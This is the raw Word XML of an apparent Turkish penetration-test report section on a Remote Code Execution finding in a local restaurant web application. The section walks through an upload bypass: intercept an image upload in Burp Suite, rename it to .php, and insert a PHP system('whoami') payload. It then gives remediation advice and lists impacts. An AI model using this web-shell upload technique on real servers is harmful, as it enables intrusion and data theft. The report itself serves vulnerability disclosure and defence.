      <w:tr w:rsidR="004E6D77" w14:paraId="04E9CE52" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4BA7F188" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="5081CA7B" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="189CC016" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="5B064805" w14:textId="77777777" w:rsidTr="00C20FA7">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E41BD42" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="5C5EC258" w14:textId="77777777" w:rsidTr="00C20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1B05C6C1" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47A692E9" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="3A4521F3" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3A5291AC" w14:textId="64C27438" w:rsidR="004E6D77" w:rsidRPr="00EE6B0D" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId31" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firma</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId32" w:history="1">
              <w:r w:rsidR="005C358A" w:rsidRPr="004E2517">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_edit_restaurant.php?id=1</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="005C358A">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. </w:t>
            </w:r>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Restaurant</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> resmi seçin butonuna tıklanır ve test.jpg dosyası sistemi yüklenir ve istek </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ve isteğe sağ tıklanıp “send to repeater” seçeneği seçilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CAB35F3" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1F41632D" w14:textId="322A6396" w:rsidR="004E6D77" w:rsidRDefault="005C358A" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F3B390D" wp14:editId="3E086D1B">
                  <wp:extent cx="5713730" cy="2694940"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="926637881"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3730" cy="2694940"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A867C28" w14:textId="01F5C19B" w:rsidR="004E6D77" w:rsidRPr="00C361DB" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="0098590C">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0455D6F6" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6C245955" w14:textId="3B2CB9A9" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Dosya uzantısı .php ile değiştirilir ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>Content-Disposition: form-data; name="update_profile_picture"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Header’ının altına </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>“&lt;?php $value = system("</w:t>
            </w:r>
            <w:r>
              <w:t>whoami</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>");  echo $value; ?&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">bu payload yazılır. Ardından istek gönderilir. Sistemden çıkış yapılır ve </w:t>
            </w:r>
            <w:hyperlink r:id="rId33" w:history="1">
              <w:r w:rsidR="005C358A" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005C358A" w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> müşteri</w:t>
            </w:r>
            <w:r w:rsidR="005C358A" w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId34" w:history="1">
              <w:r w:rsidR="005C358A" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_restaurants.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilip seçilen restauran’ın &lt;img&gt; etiketi içinde </w:t>
            </w:r>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> yüklenen dosyanın konumu bulunur. Bulunan konuma (</w:t>
            </w:r>
            <w:hyperlink r:id="rId35" w:history="1">
              <w:r w:rsidR="005C358A" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/uploads/restaurant_images/66fee861dc801_test.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="005C358A">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005C358A">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>) istek atılır. Böyle başarıyla sunucu üzerinde uzaktan kod yürütülür.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4983F409" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E6D77">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="044DB7C6" wp14:editId="77299177">
                  <wp:extent cx="5713730" cy="928370"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="5080"/>
                  <wp:docPr id="375342759"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342759" name="Resim 1" descr="metin, ekran görüntüsü, yazı tipi içeren bir resim&#10;&#10;Açıklama otomatik olarak oluşturuldu"/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId30"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="928370"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="6635D54F" w14:textId="76DAB219" w:rsidR="004E6D77" w:rsidRPr="00CF0A67" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="0098590C">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00D50E49" w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Elde </w:t>
            </w:r>
            <w:r w:rsidR="00D50E49">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Edilen Komutun Response’u</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="3234CA48" w14:textId="77777777" w:rsidTr="00C20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0934307C" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00057867" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00D60321" w14:paraId="253E3E6A" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="2E40FFB4" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">  Dosya Türü Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9E642D" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklemeye izin verilen dosya türlerini sınırlayın. Sadece belirli dosya türlerine (örneğin, .jpg, .png, .pdf) izin verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D75C645" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Dosya uzantılarını kontrol etmek yeterli değildir; dosya içeriğini de doğrulamak için MIME türü kontrolü yapın</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A44408C" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve"> Dosya Boyutu Sınırlaması:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="076D21E4" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="12"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların boyutunu sınırlayın. Belirli bir boyutun üzerinde dosya yüklemeyi engelleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00B9D1F1" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>Dosya İsimleri Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B7C12C" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların isimlerini güvenli hale getirin. Dosya isimlerindeki özel karakterleri temizleyin ve dosya isimlerini standart bir formatta düzenleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B7A9EC8" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Aynı dosya ismi ile yüklenmeleri durumunda yeni isimler verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A2A5651" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00402B96" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="28BBA8AD" w14:textId="77777777" w:rsidTr="00C20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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FED2BF1" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="3DDAD8A5" w14:textId="77777777" w:rsidTr="00C20FA7">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4242AC72" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Tam Kontrol: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde tam kontrol sağlayabilir. Bu, dosya sistemine erişim, sistem ayarlarını değiştirme ve yazılımları yükleme veya kaldırma anlamına gelir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12DE62B7" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="787DBD06" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Veri Hırsızlığı: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>RCE zafiyeti sayesinde, saldırgan hassas verilere (şifreler, kişisel bilgiler, finansal veriler vb.) erişebilir ve bunları çalabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AC99861" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="72E764D4" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Zarar Verme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde kötü amaçlı yazılımlar, virüsler veya truva atları yükleyerek sistemin işleyişini bozabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3213FD92" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="43F39AE3" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Ağ İçin Tehdit: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Hedef sistemin yanı sıra, RCE zafiyetleri, diğer bağlı sistemlere (ağdaki diğer cihazlar, sunucular vb.) de zarar verebilir veya erişim sağlayabilir.</w:t>
            </w:r>
          </w:p>
